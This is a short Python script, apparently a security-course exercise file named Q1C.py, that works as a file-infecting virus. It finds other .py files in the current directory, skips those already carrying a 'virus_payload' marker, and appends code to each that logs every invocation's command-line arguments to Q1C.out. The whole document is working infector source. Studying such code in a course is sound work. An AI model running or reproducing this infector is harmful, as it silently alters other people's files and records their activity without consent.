import os
import sys

#virus_payload
curr_directory = os.getcwd()

files = os.listdir(curr_directory)

py_files = [file for file in files if file.endswith('.py')]


for path in py_files:
    if path != 'Q1C.py':
        installed = False
        with open(path, 'r') as f:
            contents = f.read()
            virus_installed = "virus_payload" in contents

        if(not virus_installed):
            with open(path, 'a') as f:
                f.write(
'''
#virus_payload
import sys
import os
                
with open('Q1C.out', 'a') as f:
    f.write(' '.join(sys.argv) + '\\n')
''')

                f.write(
'''

''')